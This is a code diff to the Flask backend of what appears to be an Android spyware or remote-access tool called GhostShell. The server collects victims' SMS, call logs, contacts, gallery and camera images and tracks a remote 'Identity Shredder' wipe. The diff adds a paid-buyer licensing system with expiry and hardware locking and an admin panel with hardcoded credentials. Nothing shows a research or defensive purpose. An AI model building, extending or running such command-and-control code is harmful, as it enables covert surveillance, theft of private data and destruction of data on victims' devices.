@@ -12,7 +12,7 @@ from flask import Flask, request, jsonify, render_template, send_from_directory,
 from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
-app.secret_key = 'GHOSTSHELL_SECRET_KEY_BASE'
+app.secret_key = 'GHOSTSHELL_SECRET_KEY_999'
 
 clients = {}
 server_logs = []
@@ -26,7 +26,7 @@ def get_db():
         conn = psycopg2.connect(DATABASE_URL, sslmode='require')
         return conn
     else:
-        conn = sqlite3.connect('ghostshell_base.db')
+        conn = sqlite3.connect('ghostshell.db')
         return conn
 
 def init_db():
@@ -86,7 +86,6 @@ def handle_tcp_data(raw_line, cid):
             cd = clients[cid]['data']
             
             if t == 'DEVICE_INFO': cd['info'].update(packet.get('info', {}))
-            elif t == 'SCREEN_FRAME': cd['screen'] = packet.get('frame')
             elif t == 'SMS_LOG': cd['sms'] = packet.get('logs', [])
             elif t == 'CALL_LOG': cd['calls'] = packet.get('logs', [])
             elif t == 'CONTACT_LIST': cd['contacts'] = packet.get('contacts', [])
@@ -99,7 +98,6 @@ def handle_tcp_data(raw_line, cid):
             elif t == 'RECORD_STATUS': cd['media']['status'] = packet.get('status')
             elif t == 'SHRED_COMPLETE': add_log(f"CRITICAL: Identity Shredder completed on {cid}")
             elif t == 'SHRED_PENDING': add_log(f"ALERT: Identity Shredder initiated on {cid}")
-            elif t == 'ACCESSIBILITY_STATUS': add_log(f"ACCESS: Accessibility status from {cid}: {packet.get('status')}")
             elif t == 'GALLERY_PAGE_DATA': cd['gallery'].update(packet.get('data', packet))
             elif 'CHUNK' in t:
                 chunk = packet.get('chunk_data', {})
@@ -112,7 +110,12 @@ def handle_tcp_data(raw_line, cid):
                     b64_data = "".join(file_transfers.pop(fname))
                     path = os.path.join('captured_images', secure_filename(fname))
                     with open(path, 'wb') as f: f.write(base64.b64decode(b64_data))
-                else: add_log(f"Warning: END received but no data for {fname}")
+                    
+                    if t == 'CAMERA_IMAGE_END' or fname.startswith(('back_pic','front_pic')):
+                        cd['media'].update({"last_img": fname, "status": "done"})
+                        add_log(f"IMAGE SAVED: {fname}")
+                else:
+                    add_log(f"Warning: END received but no data for {fname}")
             
             add_log(f"Received {t} from {cid}")
     except Exception as e: add_log(f"Error parsing: {e}")
@@ -152,6 +155,87 @@ def index(): return render_template('index.html')
 
 @app.route('/dashboard')
 def dashboard(): return render_template('dashboard.html')
+
+@app.route('/admin')
+def admin_login_page():
+    if session.get('is_admin'): return redirect(url_for('admin_dashboard'))
+    return render_template('admin.html', view='login')
+
+@app.route('/admin/dashboard')
+def admin_dashboard():
+    if not session.get('is_admin'): return redirect(url_for('admin_login_page'))
+    conn = get_db(); cur = conn.cursor()
+    cur.execute('SELECT * FROM buyers ORDER BY created_at DESC')
+    users = fetch_all_as_dict(cur)
+    cur.close(); conn.close()
+    return render_template('admin.html', view='dashboard', users=users)
+
+@app.route('/api/buyer/login', methods=['POST'])
+def buyer_login():
+    data = request.json
+    uid, hwid = data.get('uid'), data.get('hwid')
+    conn = get_db(); cur = conn.cursor()
+    cur.execute('SELECT * FROM buyers WHERE uid = %s', (uid,))
+    user = fetch_one_as_dict(cur)
+    if not user:
+        cur.close(); conn.close()
+        return jsonify({"status": "error", "message": "UID NOT REGISTERED"}), 401
+    expiry = user['expiry_date']
+    if isinstance(expiry, str): expiry = datetime.strptime(expiry, '%Y-%m-%d %H:%M:%S')
+    if expiry < datetime.now():
+        cur.close(); conn.close()
+        return jsonify({"status": "error", "message": "ACCOUNT EXPIRED"}), 403
+    if user['locked_hwid'] is None:
+        cur.execute('UPDATE buyers SET locked_hwid = %s WHERE uid = %s', (hwid, uid))
+        conn.commit()
+    elif user['locked_hwid'] != hwid:
+        cur.close(); conn.close()
+        return jsonify({"status": "error", "message": "LOCKED TO ANOTHER DEVICE"}), 403
+    cur.close(); conn.close()
+    return jsonify({"status": "ok"})
+
+@app.route('/api/admin/login', methods=['POST'])
+def admin_login():
+    data = request.json
+    if data.get('u') == 'ghostshell' and data.get('p') == 'ghostshell10':
+        session['is_admin'] = True
+        return jsonify({"status": "ok"})
+    return jsonify({"status": "fail"}), 401
+
+@app.route('/api/admin/logout')
+def admin_logout():
+    session.pop('is_admin', None); return redirect(url_for('admin_login_page'))
+
+@app.route('/api/admin/create_user', methods=['POST'])
+def create_user():
+    if not session.get('is_admin'): return jsonify({"status": "fail"}), 403
+    data = request.json
+    uid, days = data.get('uid'), int(data.get('days', 30))
+    expiry = datetime.now() + timedelta(days=days)
+    try:
+        conn = get_db(); cur = conn.cursor()
+        cur.execute('INSERT INTO buyers (uid, expiry_date) VALUES (%s, %s)', (uid, expiry))
+        conn.commit(); cur.close(); conn.close()
+        return jsonify({"status": "ok"})
+    except Exception as e: return jsonify({"status": "error", "message": str(e)}), 400
+
+@app.route('/api/admin/reset_hwid', methods=['POST'])
+def reset_hwid():
+    if not session.get('is_admin'): return jsonify({"status": "fail"}), 403
+    uid = request.json.get('uid')
+    conn = get_db(); cur = conn.cursor()
+    cur.execute('UPDATE buyers SET locked_hwid = NULL WHERE uid = %s', (uid,))
+    conn.commit(); cur.close(); conn.close()
+    return jsonify({"status": "ok"})
+
+@app.route('/api/admin/delete_user', methods=['POST'])
+def delete_user():
+    if not session.get('is_admin'): return jsonify({"status": "fail"}), 403
+    uid = request.json.get('uid')
+    conn = get_db(); cur = conn.cursor()
+    cur.execute('DELETE FROM buyers WHERE uid = %s', (uid,))
+    conn.commit(); cur.close(); conn.close()
+    return jsonify({"status": "ok"})
 
 @app.route('/api/status')
 def get_status():
